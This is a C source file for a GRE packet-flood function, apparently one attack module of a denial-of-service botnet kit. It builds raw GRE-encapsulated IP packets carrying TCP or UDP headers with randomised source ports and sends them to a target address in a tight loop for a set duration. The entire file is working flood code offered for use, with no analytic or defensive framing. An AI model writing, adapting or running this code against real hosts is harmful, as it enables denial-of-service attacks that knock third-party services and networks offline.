#include "headers/gre_attack.h"
#include "headers/checksum.h"
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <errno.h>
#include <time.h>

struct grehdr {
    unsigned short flags;
    unsigned short protocol;
    unsigned short checksum;
    unsigned short reserved;
};

void* gre_attack(void* arg) {
    gre_attack_params* params = (gre_attack_params*)arg;
    if (!params) return NULL;

    int proto = IPPROTO_IP;
    if (params->gre_proto == 1) proto = IPPROTO_TCP;
    else if (params->gre_proto == 2) proto = IPPROTO_UDP;

    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_GRE);
    if (sock < 0) return NULL;

    int one = 1;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        close(sock);
        return NULL;
    }

    int packet_size = params->psize > 0 ? params->psize : 32;
    if (packet_size > 8192) packet_size = 8192;
    
    int min_size = sizeof(struct iphdr) + sizeof(struct grehdr);
    if (proto == IPPROTO_TCP) min_size += sizeof(struct tcphdr);
    else if (proto == IPPROTO_UDP) min_size += sizeof(struct udphdr);
    if (packet_size < min_size) packet_size = min_size;

    unsigned char *packet = calloc(1, packet_size);
    if (!packet) {
        close(sock);
        return NULL;
    }

    struct iphdr *iph = (struct iphdr*)packet;
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = htons(packet_size);
    iph->id = htons(getpid());
    iph->frag_off = 0;
    iph->ttl = 64;
    iph->protocol = IPPROTO_GRE;
    iph->check = 0;
    iph->saddr = INADDR_ANY;
    iph->daddr = params->target_addr.sin_addr.s_addr;

    struct grehdr *greh = (struct grehdr*)(packet + sizeof(struct iphdr));
    greh->flags = htons(0x2000);
    greh->protocol = htons(0x0800);

    unsigned char *inner_packet = packet + sizeof(struct iphdr) + sizeof(struct grehdr);
    struct iphdr *inner_iph = (struct iphdr*)inner_packet;
    inner_iph->ihl = 5;
    inner_iph->version = 4;
    inner_iph->tos = 0;
    inner_iph->tot_len = htons(packet_size - sizeof(struct iphdr) - sizeof(struct grehdr));
    inner_iph->id = htons(getpid());
    inner_iph->frag_off = 0;
    inner_iph->ttl = 64;
    inner_iph->protocol = proto;
    inner_iph->check = 0;
    inner_iph->saddr = INADDR_ANY;
    inner_iph->daddr = params->target_addr.sin_addr.s_addr;

    unsigned short src_port = params->srcport > 0 ? params->srcport : (rand() % 0xFFFF);
    if (proto == IPPROTO_TCP) {
        struct tcphdr *tcph = (struct tcphdr*)(inner_packet + sizeof(struct iphdr));
        tcph->source = htons(src_port);
        tcph->dest = params->target_addr.sin_port;
        tcph->seq = 0;
        tcph->ack_seq = 0;
        tcph->doff = 5;
        tcph->fin = 0;
        tcph->syn = 1;
        tcph->rst = 0;
        tcph->psh = 1;
        tcph->ack = 1;
        tcph->urg = 0;
        tcph->window = htons(64240);
        tcph->check = 0;
        tcph->urg_ptr = 0;
    } else if (proto == IPPROTO_UDP) {
        struct udphdr *udph = (struct udphdr*)(inner_packet + sizeof(struct iphdr));
        udph->source = htons(src_port);
        udph->dest = params->target_addr.sin_port;
        udph->len = htons(packet_size - sizeof(struct iphdr) - sizeof(struct grehdr) - sizeof(struct iphdr));
        udph->check = 0;
    }

    time_t end_time = time(NULL) + params->duration;
    unsigned long packets_sent = 0;
    
    while (params->active && time(NULL) < end_time) {
        iph->id = htons((getpid() + packets_sent) & 0xFFFF);
        inner_iph->id = htons((getpid() + packets_sent + 1) & 0xFFFF);
        
        unsigned short src_port = params->srcport > 0 ? params->srcport : (rand() % 0xFFFF);
        if (proto == IPPROTO_TCP) {
            struct tcphdr *tcph = (struct tcphdr*)(inner_packet + sizeof(struct iphdr));
            tcph->source = htons(src_port);
            tcph->seq = htonl(packets_sent);
            tcph->check = 0;
            tcph->check = tcp_udp_checksum(tcph, ntohs(inner_iph->tot_len) - sizeof(struct iphdr),
                                         inner_iph->saddr, inner_iph->daddr, IPPROTO_TCP);
        } else if (proto == IPPROTO_UDP) {
            struct udphdr *udph = (struct udphdr*)(inner_packet + sizeof(struct iphdr));
            udph->source = htons(src_port);
            udph->check = 0;
            udph->check = tcp_udp_checksum(udph, ntohs(inner_iph->tot_len) - sizeof(struct iphdr),
                                         inner_iph->saddr, inner_iph->daddr, IPPROTO_UDP);
        }

        inner_iph->check = 0;
        inner_iph->check = generic_checksum(inner_iph, sizeof(struct iphdr));
        
        greh->checksum = 0;
        greh->reserved = htons(packets_sent & 0xFFFF);
        greh->checksum = generic_checksum(greh, packet_size - sizeof(struct iphdr));

        iph->check = 0;
        iph->check = generic_checksum(iph, sizeof(struct iphdr));

        if (sendto(sock, packet, packet_size, 0, 
                  (struct sockaddr*)&params->target_addr, sizeof(params->target_addr)) > 0) {
            packets_sent++;
        }
    }

    free(packet);
    close(sock);
    return NULL;
}
